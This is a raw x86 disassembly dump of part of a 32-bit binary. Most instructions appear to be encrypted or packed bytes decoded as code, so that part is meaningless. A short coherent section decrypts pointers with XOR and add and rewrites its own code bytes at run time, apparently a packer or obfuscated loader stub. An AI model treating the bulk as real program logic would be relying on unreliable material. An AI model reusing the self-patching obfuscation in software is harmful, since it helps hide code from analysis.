  4142f9:	add    BYTE PTR [edx-0x29688184],0xd6
  414300:	push   0x76324633
  414305:	push   ebx
  414306:	or     BYTE PTR [ebx-0x59],dh
  414309:	int    0x19
  41430b:	cmp    dh,BYTE PTR [esi]
  41430d:	es in  eax,dx
  41430f:	cmp    al,0xc5
  414311:	jmp    0xee020032
  414316:	xchg   esi,eax
  414317:	mov    ebp,0x89108dcf
  41431c:	sbb    DWORD PTR [edx-0x37],ecx
  41431f:	repnz mov dl,0x8
  414322:	imul   ecx,DWORD PTR gs:[edi-0x79118518],0xffffffdc
  41432a:	retf   0x7419
  41432d:	rcr    BYTE PTR [edx+0x35],cl
  414330:	std    
  414331:	xor    BYTE PTR [edx-0x5a],ch
  414334:	out    dx,eax
  414335:	push   ss
  414336:	in     al,0x2e
  414338:	xor    DWORD PTR [edx+0x27d2a088],ebx
  41433e:	gs add eax,0x1af915bf
  414344:	rol    DWORD PTR [edi-0x3af0c37d],0xe6
  41434b:	pop    es
  41434c:	and    BYTE PTR [bp+si],al
  41434f:	push   0xffffffc3
  414351:	gs cmp DWORD PTR ds:[ebx-0x792c0002],edx
  414359:	lods   al,BYTE PTR ds:[esi]
  41435a:	or     bh,BYTE PTR [ecx+esi*2]
  41435d:	and    bh,BYTE PTR [eax+0x20c7ed8f]
  414363:	addr16 mov ds:0x6889,al
  414367:	inc    esi
  414368:	aas    
  414369:	std    
  41436a:	retf   0x6fa3
  41436d:	shl    DWORD PTR [esi-0x1e],cl
  414370:	inc    esi
  414371:	add    DWORD PTR [esi-0x36],esp
  414374:	add    esi,edi
  414376:	jl     0x4143d1
  414378:	sub    eax,0x2753e936
  41437d:	lods   al,BYTE PTR ds:[esi]
  41437e:	stc    
  41437f:	fsub   QWORD PTR [ebp+0x74]
  414382:	jo     0x414320
  414384:	int    0x25
  414386:	push   ebp
  414387:	adc    dh,BYTE PTR [edi-0x33]
  41438a:	scas   eax,DWORD PTR es:[edi]
  41438b:	pop    ebx
  41438c:	xchg   edx,eax
  41438d:	into   
  41438e:	add    al,0x7c
  414390:	pop    ss
  414391:	shl    BYTE PTR [ebx-0x7b],1
  414394:	jmp    0x414318
  414396:	test   BYTE PTR [eax+0x60fdf0af],cl
  41439c:	mov    ch,0xf9
  41439e:	pop    eax
  41439f:	and    edx,DWORD PTR [edx]
  4143a1:	ror    DWORD PTR [edx],0x7a
  4143a4:	je     0x41432a
  4143a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4143a7:	jne    0x4143f2
  4143a9:	jne    0x4143bf
  4143ab:	mov    ebx,0x79259f31
  4143b0:	leave  
  4143b1:	jne    0x414403
  4143b3:	inc    edx
  4143b4:	hlt    
  4143b5:	push   cs
  4143b6:	or     al,0xb6
  4143b8:	sub    al,0xf5
  4143ba:	xlat   BYTE PTR ds:[ebx]
  4143bb:	test   eax,0x288eee5d
  4143c0:	retf   
  4143c1:	xlat   BYTE PTR ds:[ebx]
  4143c2:	popa   
  4143c3:	out    0xf4,eax
  4143c5:	(bad)  
  4143c6:	xor    bh,BYTE PTR [ecx+0x7f]
  4143c9:	sahf   
  4143ca:	ret    
  4143cb:	hlt    
  4143cc:	fadd   QWORD PTR [edx+0x32]
  4143cf:	aad    0xac
  4143d1:	inc    ebp
  4143d2:	and    al,0x8
  4143d4:	push   eax
  4143d5:	retf   
  4143d6:	loop   0x4143b5
  4143d8:	out    0xe,al
  4143da:	retf   0x1ef2
  4143dd:	pop    edi
  4143de:	icebp  
  4143df:	hlt    
  4143e0:	in     eax,dx
  4143e1:	dec    esp
  4143e2:	neg    DWORD PTR [edx+ebp*1]
  4143e5:	push   edi
  4143e6:	fcmovu st,st(1)
  4143e8:	mov    ds:0x608f43b3,al
  4143ed:	mov    ds:0x217d408e,eax
  4143f3:	inc    edi
  4143f4:	xchg   esp,eax
  4143f5:	or     al,0x29
  4143f7:	sti    
  4143f8:	pushf  
  4143f9:	adc    al,0x72
  4143fb:	inc    esi
  4143fc:	sub    bh,bl
  4143fe:	adc    ebp,esi
  414400:	repnz push ebx
  414402:	lea    eax,[edx]
  414404:	and    ebx,DWORD PTR [ebx-0x35]
  414407:	push   0xffffffb7
  414409:	jb     0x4143d3
  41440b:	mov    dh,0x1d
  41440d:	push   ecx
  41440e:	out    dx,al
  41440f:	les    eax,FWORD PTR [edi]
  414411:	add    DWORD PTR [ecx],esp
  414413:	push   edx
  414414:	clc    
  414415:	enter  0xd238,0x4c
  414419:	dec    edi
  41441a:	or     dh,BYTE PTR [ebp+0x37]
  41441d:	ja     0x41439f
  41441f:	dec    esi
  414420:	xor    dl,dh
  414422:	jle    0x41445e
  414424:	dec    esp
  414425:	arpl   WORD PTR [ecx],ax
  414427:	pop    ebx
  414428:	cs shr esi,cl
  41442b:	retf   
  41442c:	jns    0x4143dc
  41442e:	xchg   BYTE PTR [edi-0x735e612b],al
  414434:	out    dx,al
  414435:	inc    edx
  414436:	adc    eax,0x4880ad1e
  41443b:	cmp    DWORD PTR [edx+0x44],0xffffff8c
  41443f:	inc    edi
  414440:	sbb    ecx,DWORD PTR [ebx+0x277e6425]
  414446:	std    
  414447:	in     al,0x28
  414449:	jp     0x4144c0
  41444b:	cmp    ebx,eax
  41444d:	xor    DWORD PTR [ecx],edi
  41444f:	ss mov ebx,0x4d92df66
  414455:	push   ds
  414456:	out    0x43,eax
  414458:	pop    eax
  414459:	rol    BYTE PTR [ebx+0x21c60131],0x24
  414460:	ret    
  414461:	pop    esp
  414462:	cmp    bh,ah
  414464:	aaa    
  414465:	add    bl,0xed
  414468:	rcr    DWORD PTR [ecx-0x47b0cffd],cl
  41446e:	cs out 0xa7,eax
  414471:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414472:	and    eax,0x50b3a83
  414477:	cmp    DWORD PTR [esi+0x52],ebx
  41447a:	mov    edi,0xa65d7123
  41447f:	sbb    esi,edx
  414481:	fwait
  414482:	in     al,0x34
  414484:	pop    edi
  414485:	out    0x67,al
  414487:	cwde   
  414488:	test   eax,0x4d110d6b
  41448d:	add    dl,BYTE PTR [edi+0x38d69a0d]
  414493:	inc    edx
  414494:	jns    0x4144d2
  414496:	lea    ebp,[edi+edx*8+0x1fb08677]
  41449d:	cs inc eax
  41449f:	add    bl,0x8
  4144a2:	pop    edi
  4144a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4144a4:	jmp    0x5ed2ac4f
  4144a9:	loope  0x41450f
  4144ab:	jle    0x41445e
  4144ad:	jne    0x414441
  4144af:	fwait
  4144b0:	mov    ecx,0x7bb1069e
  4144b5:	xor    eax,DWORD PTR [eax+edx*4]
  4144b8:	ror    ah,1
  4144ba:	mov    ch,0xf1
  4144bc:	iret   
  4144bd:	push   0x50
  4144bf:	(bad)  
  4144c0:	dec    ecx
  4144c1:	or     BYTE PTR [edi-0x367b85af],0xcc
  4144c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4144c9:	dec    ebp
  4144ca:	sti    
  4144cb:	sub    cl,0x52
  4144ce:	jecxz  0x41448f
  4144d0:	xchg   ebx,eax
  4144d1:	pushf  
  4144d2:	shl    dl,0x3d
  4144d5:	aad    0x36
  4144d7:	mov    eax,0x47f05c69
  4144dc:	xchg   esi,eax
  4144dd:	xchg   ebx,eax
  4144de:	call   0x460e:0xf37dec15
  4144e5:	jnp    0x41452a
  4144e7:	dec    edx
  4144e8:	rol    BYTE PTR [esi-0x7c],0x54
  4144ec:	aad    0x60
  4144ee:	mov    BYTE PTR [edi],bl
  4144f0:	(bad)
  4144f4:	mov    al,ds:0x3ceef706
  4144f9:	call   0x1c02:0x7e788fc3
  414500:	mov    eax,0xb4fcb716
  414505:	lods   al,BYTE PTR ds:[esi]
  414506:	xor    DWORD PTR [ecx],esp
  414508:	mov    ds:0x3bac4e60,al
  41450d:	dec    eax
  41450e:	xchg   edx,eax
  41450f:	test   BYTE PTR [edx+0x6dc679ab],0xdb
  414516:	push   ds
  414517:	pop    eax
  414518:	out    dx,al
  414519:	cld    
  41451a:	push   ebx
  41451b:	mov    bh,0x8a
  41451d:	push   eax
  41451e:	jge    0x4144ad
  414520:	in     al,0xd5
  414522:	mov    fs,WORD PTR [ebx+ebx*8]
  414525:	scas   eax,DWORD PTR es:[edi]
  414526:	add    cl,0x78
  414529:	loope  0x41450c
  41452b:	push   edi
  41452c:	inc    edi
  41452d:	mov    al,0x7d
  41452f:	std    
  414530:	cmp    cl,BYTE PTR [esi]
  414532:	inc    ecx
  414533:	push   edi
  414534:	into   
  414535:	test   BYTE PTR [ebx],bh
  414537:	dec    edx
  414538:	test   eax,0xc5e3f130
  41453d:	ss mov ebx,0x316c842c
  414543:	retf   0x1423
  414546:	jbe    0x414538
  414548:	rol    dh,cl
  41454a:	mov    ebx,0x882bbe5c
  41454f:	mov    ecx,0x817e7af7
  414554:	mov    ebx,0xebeb64
  414559:	or     ecx,ecx
  41455b:	icebp  
  41455c:	push   0xffffffba
  41455e:	test   esp,ebx
  414560:	es std 
  414562:	pop    esp
  414563:	sub    al,0xca
  414565:	rcr    esp,1
  414567:	push   es
  414568:	in     al,0x3d
  41456a:	(bad)  
  41456c:	and    ah,dl
  41456e:	cwde   
  41456f:	fsub   st,st(3)
  414571:	scas   eax,DWORD PTR es:[edi]
  414572:	xor    ch,BYTE PTR [eax]
  414574:	outs   dx,BYTE PTR ds:[esi]
  414575:	test   eax,0x257a91a3
  41457a:	mov    DWORD PTR [esi+ecx*4-0x19],eax
  41457e:	mov    al,0xce
  414580:	shl    BYTE PTR [ebp-0x60],0x92
  414584:	jbe    0x4145f4
  414586:	pop    edx
  414587:	mov    esp,eax
  414589:	push   edx
  41458a:	popf   
  41458b:	aas    
  41458c:	and    DWORD PTR [eax],ebx
  41458e:	jnp    0x4145ad
  414590:	cdq    
  414591:	int    0xb7
  414593:	jecxz  0x414604
  414595:	push   0x1c
  414597:	(bad)  
  414599:	add    al,0xf1
  41459b:	fdiv   QWORD PTR [edi-0x2e9a0404]
  4145a1:	lds    esp,FWORD PTR [edi+0x7884ae04]
  4145a7:	pop    es
  4145a8:	pushf  
  4145a9:	ret    
  4145aa:	push   eax
  4145ab:	push   ss
  4145ac:	retf   0x7cf8
  4145af:	add    al,0x8f
  4145b1:	xor    DWORD PTR ds:0x66b99713,esi
  4145b7:	pmulhuw mm7,QWORD PTR [ebp+ebp*1-0x7413b263]
  4145bf:	cmp    al,0xb9
  4145c1:	loope  0x4145b1
  4145c3:	hlt    
  4145c4:	mov    cl,0x96
  4145c6:	ret    0xc117
  4145c9:	pop    ebp
  4145ca:	jl     0x414553
  4145cc:	jle    0x4145f4
  4145ce:	xlat   BYTE PTR ds:[ebx]
  4145cf:	sti    
  4145d0:	jmp    0x5283:0xada5630b
  4145d7:	mov    esp,?
  4145d9:	rcl    bh,cl
  4145db:	jnp    0x414641
  4145dd:	adc    eax,0x3e55d498
  4145e2:	mov    ah,0x17
  4145e4:	or     BYTE PTR es:[edx-0x11b9498],al
  4145eb:	pop    edx
  4145ec:	jb     0x4145fe
  4145ee:	jge    0x4145b9
  4145f0:	dec    ebp
  4145f1:	repnz push ds
  4145f3:	push   edx
  4145f4:	xor    edx,esi
  4145f6:	mov    ecx,0x119e42f4
  4145fb:	out    0x2,eax
  4145fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4145fe:	nop
  4145ff:	sbb    esp,DWORD PTR [edi]
  414601:	jmp    0x4145b3
  414603:	ins    BYTE PTR es:[edi],dx
  414604:	fldcw  WORD PTR [ebx+0x9]
  414607:	mov    bl,0x10
  414609:	pop    ss
  41460a:	push   esi
  41460c:	add    bh,BYTE PTR [edi]
  41460e:	sub    DWORD PTR [ebx-0x16920db2],ecx
  414614:	or     al,0xb5
  414616:	out    0xca,eax
  414618:	sbb    eax,DWORD PTR ss:[ebp+0x37]
  41461c:	xchg   esp,eax
  41461d:	mov    al,BYTE PTR [edx]
  41461f:	push   ds
  414620:	and    ebx,DWORD PTR [ecx-0x7e592914]
  414626:	imul   ebx,DWORD PTR [ecx],0xd883f97a
  41462c:	out    dx,eax
  41462d:	push   eax
  41462e:	out    dx,eax
  41462f:	dec    esi
  414630:	cmp    eax,0x146efe32
  414635:	scas   al,BYTE PTR es:[edi]
  414636:	ror    cl,0xaa
  414639:	into   
  41463a:	cmp    al,0x69
  41463c:	push   cs
  41463d:	push   ss
  41463e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41463f:	inc    edi
  414640:	mov    dh,0xbf
  414642:	sbb    eax,0xc7b9cb7d
  414647:	xor    bl,BYTE PTR [ecx]
  414649:	cs push ss
  41464b:	pop    esp
  41464c:	ret    
  41464d:	xchg   edi,eax
  41464e:	xor    esi,DWORD PTR [ecx+0x2e]
  414651:	enter  0x5f6d,0x98
  414655:	mov    edx,0xab26bb98
  41465a:	add    eax,DWORD PTR [esi+0x3f]
  41465d:	mov    bl,0x38
  41465f:	xchg   ebx,eax
  414660:	ins    DWORD PTR es:[edi],dx
  414661:	pusha  
  414662:	push   eax
  414663:	int    0x2e
  414665:	lea    eax,[bx+si-0x140e]
  41466a:	mov    ebx,edx
  41466c:	push   ecx
  41466d:	xor    eax,esi
  41466f:	add    eax,edi
  414671:	push   eax
  414672:	mov    eax,DWORD PTR [ebp-0x1c]
  414675:	xor    eax,esi
  414677:	add    eax,edi
  414679:	push   eax
  41467a:	mov    eax,DWORD PTR [ebp-0x10]
  41467d:	xor    eax,esi
  41467f:	add    eax,edi
  414681:	push   eax
  414682:	lea    eax,[ebp-0x90]
  414688:	push   eax
  414689:	push   DWORD PTR [ebp-0x20]
  41468c:	push   DWORD PTR [ebp-0x30]
  41468f:	call   0x40f89f
  414694:	test   eax,eax
  414696:	je     0x4146c7
  41469c:	lea    eax,[ebp-0x90]
  4146a2:	push   eax
  4146a3:	mov    eax,DWORD PTR [ebp-0x30]
  4146a6:	xor    eax,esi
  4146a8:	add    eax,edi
  4146aa:	push   eax
  4146ab:	mov    eax,DWORD PTR [ebp-0x2c]
  4146ae:	add    eax,0xaa
  4146b3:	push   eax
  4146b4:	mov    eax,DWORD PTR [ebp-0x2c]
  4146b7:	mov    eax,DWORD PTR [eax+0x198]
  4146bd:	push   DWORD PTR [eax]
  4146bf:	call   0x40867e
  4146c4:	mov    DWORD PTR [ebp-0x40],eax
  4146c7:	lea    eax,[ebp+0x4]
  4146ca:	mov    DWORD PTR [ebp-0x34],eax
  4146cd:	mov    eax,DWORD PTR [ebp-0x8]
  4146d0:	mov    eax,DWORD PTR [eax]
  4146d2:	mov    eax,DWORD PTR [eax]
  4146d4:	mov    eax,DWORD PTR [eax]
  4146d6:	test   eax,eax
  4146d8:	je     0x416aa8
  4146de:	lea    eax,[ebp-0xc]
  4146e1:	mov    DWORD PTR [ebp-0x4c],eax
  4146e4:	mov    eax,DWORD PTR [ebp-0x3c]
  4146e7:	mov    DWORD PTR [ebp-0xc],eax
  4146ea:	mov    eax,DWORD PTR [ebp-0x8]
  4146ed:	mov    eax,DWORD PTR [eax]
  4146ef:	mov    eax,DWORD PTR [eax]
  4146f1:	mov    eax,DWORD PTR [eax]
  4146f3:	sub    DWORD PTR [ebp-0xc],eax
  4146f6:	mov    ecx,DWORD PTR [ebp-0x10]
  4146f9:	xor    ecx,esi
  4146fb:	mov    eax,0xffcd8d25
  414700:	sub    eax,ecx
  414702:	add    DWORD PTR [ebp-0xc],eax
  414705:	mov    eax,DWORD PTR [ebp-0xc]
  414708:	mov    ecx,DWORD PTR [ebp-0x8]
  41470b:	mov    ecx,DWORD PTR [ecx]
  41470d:	mov    ecx,DWORD PTR [ecx]
  41470f:	mov    ecx,DWORD PTR [ecx]
  414711:	mov    DWORD PTR [ecx+0x1],eax
  414714:	mov    al,BYTE PTR [ebp-0x1]
  414717:	mov    ecx,DWORD PTR [ebp-0x8]
  41471a:	mov    ecx,DWORD PTR [ecx]
  41471c:	mov    ecx,DWORD PTR [ecx]
  41471e:	mov    ecx,DWORD PTR [ecx]
  414720:	push   DWORD PTR [ebp-0x2c]
  414723:	xor    al,0x6f
  414725:	sub    al,0xd
  414727:	mov    BYTE PTR [ecx],al
  414729:	mov    eax,ds:0x423e16
  41472e:	push   DWORD PTR [eax]
  414730:	push   DWORD PTR ds:0x424072
  414736:	push   DWORD PTR ds:0x423e1e
  41473c:	push   DWORD PTR ds:0x424052
  414742:	push   DWORD PTR ds:0x4240da
  414748:	push   DWORD PTR [ebp-0x30]
  41474b:	jmp    0x416a9a
  414750:	jp     0x414751
  414752:	int    0x35
  414754:	ret    
  414755:	add    ecx,DWORD PTR [edx-0x41938645]
  41475b:	pop    ss
  41475c:	mov    edi,0x8c1ff3a2
  414761:	dec    eax
  414762:	popa   
  414763:	bound  edx,QWORD PTR [eax+0x5f]
  414766:	bound  esp,QWORD PTR [edx-0x5e]
  414769:	adc    ecx,DWORD PTR [ecx+0x61b4f1e5]
  41476f:	mov    esi,0xd076d0da
  414774:	loope  0x4147b3
  414776:	std    
  414777:	test   DWORD PTR [edx+0x3b],0x15ed43c4
  41477e:	js     0x4147f7
  414780:	or     eax,0x7747ca74
  414785:	mov    dh,0xe2
  414787:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414788:	or     dh,al
  41478a:	or     edi,DWORD PTR [ebx]
  41478c:	stc    
  41478d:	cmp    eax,0x255e8e2d
  414792:	fidivr WORD PTR [edx+0x75]
  414795:	aam    0x86
  414797:	and    cl,ah
  414799:	and    dl,BYTE PTR [edi+0x6fca930a]
  41479f:	inc    esi
  4147a0:	xchg   edi,eax
  4147a1:	adc    al,0x95
  4147a3:	push   0xf9ca2f41
  4147a8:	jmp    0x414732
  4147aa:	retfw  0xc0ae
  4147ae:	jp     0x4147ea
  4147b0:	xchg   esp,eax
  4147b1:	adc    DWORD PTR [edi-0x67],eax
  4147b4:	mov    bh,0xbf
  4147b6:	outs   dx,BYTE PTR ds:[esi]
  4147b7:	sbb    ah,BYTE PTR [edx+ecx*4+0x532f7ab7]
  4147be:	cmp    eax,0x7b9ef7e2
  4147c3:	fidiv  WORD PTR [ecx-0x51]
  4147c6:	cmp    DWORD PTR [ebx+esi*2],edx
  4147c9:	fsubr  st,st(7)
  4147cb:	adc    DWORD PTR [esi-0x7d3044ca],eax
  4147d1:	fdiv   st,st(3)
  4147d3:	or     DWORD PTR [ebp-0x24],ebp
  4147d6:	fimul  DWORD PTR [ebp-0xe]
  4147d9:	jne    0x41478f
  4147db:	fcmovnb st,st(7)
  4147dd:	cli    
  4147de:	std    
  4147df:	into   
  4147e0:	add    dl,al
  4147e2:	pop    es
  4147e3:	lock mul BYTE PTR [edi-0x54]
  4147e7:	nop
  4147e8:	(bad)  
  4147e9:	mov    edx,0xac3794a0
  4147ee:	out    0x6b,eax
  4147f0:	xchg   esp,eax
  4147f1:	mov    edi,0x8495ea79
  4147f6:	lock gs pop ebx
  4147f9:	push   ebp
  4147fa:	fadd   DWORD PTR [eax+0x22]
  4147fd:	sti    
  4147fe:	add    eax,0x930473d3
  414803:	je     0x414852
  414805:	call   0x515ab686
  41480a:	repz xlat BYTE PTR ds:[ebx]
  41480c:	inc    esi
  41480d:	ror    DWORD PTR [edx-0x6f],cl
  414810:	out    0xb6,eax
  414812:	data16 arpl WORD PTR [ebp-0x7b],bx
  414816:	adc    edi,DWORD PTR [edi+ebx*8-0x58]
  41481a:	inc    ebx
  41481b:	and    bh,al
  41481d:	aam    0x1d
  41481f:	repz and bl,ah
  414822:	jp     0x414826
  414824:	call   0x62d7a47b
  414829:	mov    edi,0xcb741570
  41482e:	aad    0x26
  414830:	inc    edx
  414831:	(bad)  
  414832:	into   
  414833:	shl    esp,1
  414835:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414836:	push   es
  414837:	out    dx,eax
  414838:	int3   
  414839:	pop    ebp
  41483a:	push   esi
  41483b:	hlt    
  41483c:	push   ss
  41483d:	xchg   ebp,eax
  41483e:	sbb    ecx,esi
  414840:	rcr    DWORD PTR [edi-0x52],0xeb
  414844:	sub    al,dl
  414846:	pop    ss
  414847:	pop    eax
  414848:	sub    BYTE PTR [edx-0x2d],0x6a
  41484c:	dec    eax
  41484d:	(bad)  
  41484e:	cmp    BYTE PTR [edx+0xb],bh
  414851:	xchg   ebp,eax
  414852:	jnp    0x4147e6
  414854:	dec    esi
  414855:	ins    DWORD PTR es:[edi],dx
  414856:	cmp    eax,0x66a99707
  41485b:	xchg   ch,al
  41485d:	mov    ebx,DWORD PTR [ecx+0xd90a236]
  414863:	and    esi,DWORD PTR [ecx+0x55]
  414866:	jns    0x4148be
  414868:	test   BYTE PTR [esi-0x68],al
  41486b:	aaa    
  41486c:	jg     0x414865
  41486e:	stos   BYTE PTR es:[edi],al
  41486f:	sub    al,0xf8
  414871:	in     eax,0x21
  414873:	test   esp,esi
  414875:	sub    ecx,0xffffff91
  414878:	dec    esp
  414879:	mov    ds:0x45b32cf5,eax
  41487e:	jg     0x414834
  414880:	add    BYTE PTR gs:[edi-0x4b],bh
  414884:	sbb    al,0xd8
  414886:	xor    cl,bl
  414888:	ds fdiv st(5),st
  41488b:	js     0x414823
  41488d:	push   eax
  41488e:	jp     0x41481a
  414890:	lods   al,BYTE PTR ds:[esi]
  414891:	add    dh,BYTE PTR [eax+ecx*8-0x1493992b]
  414898:	(bad)
  41489b:	or     BYTE PTR [ecx-0x21e060b3],dl
  4148a1:	inc    edx
  4148a2:	sar    BYTE PTR [ebp-0xdd94ccb],cl
  4148a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148a9:	inc    edx
  4148aa:	xchg   ebp,eax
  4148ab:	shl    BYTE PTR [edx+0x7ecb0efc],1
  4148b1:	inc    edx
  4148b2:	cli    
  4148b3:	nop
  4148b4:	mul    DWORD PTR [ecx+0x2c]
  4148b7:	mov    bh,0xfa
  4148b9:	mov    eax,ds:0xb16a2dfe
  4148be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4148bf:	in     al,0x88
  4148c1:	mov    edx,es
  4148c3:	jl     0x414921
  4148c5:	hlt    
  4148c6:	out    0xd4,al
  4148c8:	ds push edi
  4148ca:	inc    esp
  4148cb:	loope  0x414941
  4148cd:	inc    ebx
  4148ce:	and    esp,DWORD PTR [edi+ecx*1+0x3e]
  4148d2:	mov    eax,ds:0xc2428eeb
  4148d7:	jb     0x4148ad
  4148d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4148da:	in     al,0x2e
  4148dc:	in     al,dx
  4148dd:	and    ebx,edx
  4148df:	bound  esi,QWORD PTR [eax+0xd048646]
  4148e5:	and    eax,0xd1e10d77
  4148ea:	mov    cl,0x5b
  4148ec:	lods   al,BYTE PTR ds:[esi]
  4148ed:	lock aaa 
  4148ef:	and    al,BYTE PTR [eax-0xf168296]
  4148f5:	out    0x44,eax
  4148f7:	ror    ah,cl
  4148f9:	(bad)  
  4148fa:	imul   esi,DWORD PTR [eax-0x79d0913e],0xffffff8d
  414901:	xor    ecx,DWORD PTR [ebx+0x25]
  414904:	(bad)
  414907:	or     eax,0x78f38f6c
  41490c:	mov    BYTE PTR [edi+0x1403b553],ah
  414912:	pop    edx
  414913:	in     eax,dx
  414914:	mov    dl,0x75
  414916:	in     al,0xd
  414918:	xchg   esp,eax
  414919:	inc    esi
  41491a:	aad    0x9c
  41491c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41491d:	add    BYTE PTR [esp+edx*4-0x28],dh
  414921:	adc    esp,DWORD PTR [ebx+0x5cf49827]
  414927:	inc    esp
  414928:	dec    esi
  414929:	mov    bl,0x85
  41492b:	das    
  41492c:	cdq    
  41492d:	inc    eax
  41492e:	fisubr WORD PTR [esi+edx*2]
  414931:	test   DWORD PTR [ebp-0x39],eax
  414934:	mov    DWORD PTR [ecx+esi*8-0x2dfcc745],edx
  41493b:	mul    BYTE PTR [ebx+0x67]
  41493e:	xor    BYTE PTR [edi-0xb4f6e96],cl
  414944:	xchg   esi,eax
  414945:	imul   eax,ebp,0xffffffed
  414948:	fnclex 
  41494a:	popf   
  41494b:	test   al,0xa1
  41494d:	jle    0x414996
  41494f:	popf   
  414950:	cmp    DWORD PTR [ecx],0x1a
  414953:	leave  
  414954:	test   al,bh
  414956:	mov    eax,0xe2a6d724
  41495b:	add    ah,BYTE PTR [ebx+0x28ecc6a4]
  414961:	jp     0x41490d
  414963:	js     0x414954
  414965:	arpl   WORD PTR [edx+0x42],dx
  414968:	repz repz fisubr DWORD PTR [eax+esi*8-0x57e07274]
  414971:	xchg   ecx,eax
  414972:	rol    DWORD PTR [esi+0xd],0x78
  414976:	(bad)  
  414977:	stc    
  414978:	fild   DWORD PTR [ebx-0x6a]
  41497b:	or     edx,ebp
  41497d:	jmp    0x3b43e721
  414982:	inc    ebx
  414983:	cmc    
  414984:	pushf  
  414985:	pop    ebx
  414986:	mov    cl,0x38
  414988:	loop   0x41491e
  41498a:	mov    ebp,0xe7e59520
  41498f:	pop    ebx
  414990:	push   eax
  414991:	inc    ecx
  414992:	pop    edx
  414993:	ret    0xe044
  414996:	xor    BYTE PTR [ebp+0x53],dh
  414999:	arpl   WORD PTR [ebx-0xe],di
  41499c:	mov    ah,0x2c
  41499e:	push   0x7d
  4149a0:	ret    0x8c
  4149a3:	xchg   edx,eax
  4149a4:	xchg   DWORD PTR fs:[ebp-0x4440d60f],ebp
  4149ab:	mov    ah,0xd9
  4149ad:	pusha  
  4149ae:	or     DWORD PTR [eax+0x4d],ecx
  4149b1:	push   0x6
  4149b3:	test   DWORD PTR [edx-0x3b5ce779],edx
  4149b9:	dec    edx
  4149ba:	(bad)  
  4149bb:	mov    al,0xb2
  4149bd:	sbb    eax,0x2e7e94c0
  4149c2:	dec    edi
  4149c3:	dec    ebp
  4149c4:	dec    esi
  4149c5:	push   cs
  4149c6:	sbb    DWORD PTR [eax+esi*8+0x24],eax
  4149ca:	neg    eax
  4149cc:	scas   al,BYTE PTR es:[edi]
  4149cd:	lock mov ah,0x15
  4149d0:	neg    edi
  4149d2:	and    ebx,ebx
  4149d4:	push   ebp
  4149d5:	nop
  4149d6:	sub    DWORD PTR [edx-0x19],ebp
  4149d9:	les    edi,FWORD PTR [edi-0x63]
  4149dc:	inc    eax
  4149dd:	mov    ebx,DWORD PTR ss:0x9ccda4d7
  4149e4:	push   esp
  4149e5:	sar    BYTE PTR [ecx-0x6e205d35],0xe2
  4149ec:	xchg   DWORD PTR ds:0x1ec97ae2,esi
  4149f2:	in     al,dx
  4149f3:	aam    0x11
  4149f5:	mov    edi,0x4259b781
  4149fa:	sti    
  4149fb:	clc    
  4149fc:	or     eax,0xa289a70f
  414a01:	jge    0x414a72
  414a03:	or     ah,dh
  414a05:	jo     0x414a60
  414a07:	out    dx,eax
  414a08:	mov    cl,0xeb
  414a0a:	xchg   edi,eax
  414a0c:	es loope 0x414a0c
  414a0f:	jmp    0x414a44
  414a11:	shr    dh,0xad
  414a14:	add    DWORD PTR [ecx],ebp
  414a16:	mov    BYTE PTR [ebx],bl
  414a18:	mov    bh,0x95
  414a1a:	(bad)  
  414a1b:	lahf   
  414a1c:	push   cs
  414a1d:	retf   0xfc28
  414a20:	pop    esi
  414a21:	inc    esp
  414a22:	xor    BYTE PTR ss:[edi],dl
  414a25:	push   esi
  414a26:	js     0x414a86
  414a28:	sti    
  414a29:	cld    
  414a2a:	bound  esp,QWORD PTR [ebp-0x27403b6f]
  414a30:	ret    
  414a31:	hlt    
  414a32:	mul    BYTE PTR [esi+0x76]
  414a35:	jp     0x414a35
  414a37:	and    BYTE PTR [edi+0x3d],cl
  414a3a:	sti    
  414a3b:	dec    ebp
  414a3c:	mov    dh,0x9b
  414a3e:	xchg   DWORD PTR cs:[ecx],esi
  414a41:	imul   ebp,DWORD PTR [eax],0x38
  414a44:	pop    ds
  414a45:	fidiv  WORD PTR cs:[eax-0x56]
  414a49:	fcmovne st,st(0)
  414a4b:	cs gs daa 
  414a4e:	pop    esi
  414a4f:	rcl    DWORD PTR [esp+ecx*4-0xe28e8c],cl
  414a56:	in     al,dx
  414a57:	add    ah,BYTE PTR [ecx]
  414a59:	aad    0x92
  414a5b:	enter  0xda69,0xd5
  414a5f:	mov    bl,0xdd
  414a61:	push   ss
  414a62:	int3   
  414a63:	lds    eax,FWORD PTR [ecx-0x3bdf8293]
  414a69:	in     eax,0x45
  414a6b:	add    eax,0x543bccf9
  414a70:	push   esp
  414a71:	push   edi
  414a72:	loopne 0x414ac3
  414a74:	rol    DWORD PTR [esi-0x50549155],0xeb
  414a7b:	sar    DWORD PTR [esi+0x50],0x37
  414a7f:	and    esi,esp
  414a81:	out    dx,eax
  414a82:	mov    ecx,0xaa269819
  414a87:	mov    DWORD PTR [ecx+edx*8-0x4402d9ce],ebx
  414a8e:	call   FWORD PTR [edx+0x40e35c6b]
  414a94:	sub    DWORD PTR [ebx+0x238d9ca9],esp
  414a9a:	ins    BYTE PTR es:[edi],dx
  414a9b:	mov    eax,ds:0x96bee772
  414aa0:	fiadd  DWORD PTR [eax-0xe60ca29]
  414aa6:	mov    esp,0x35d3d15b
  414aab:	ins    DWORD PTR es:[edi],dx
  414aac:	dec    eax
  414aad:	arpl   WORD PTR [ebx-0x3a],cx
  414ab0:	rcr    BYTE PTR [ebx],cl
  414ab2:	mov    DWORD PTR [ebp+0x49fb5126],ebp
  414ab8:	lahf   
  414ab9:	out    0x4c,eax
  414abb:	in     al,0x76
  414abd:	icebp  
  414abe:	fucomi st,st(5)
  414ac0:	cmp    al,BYTE PTR [edx]
  414ac2:	mov    eax,0xa0c6d162
  414ac7:	inc    ebp
  414ac8:	das    
  414ac9:	jb     0x414af0
  414acb:	jb     0x414a6e
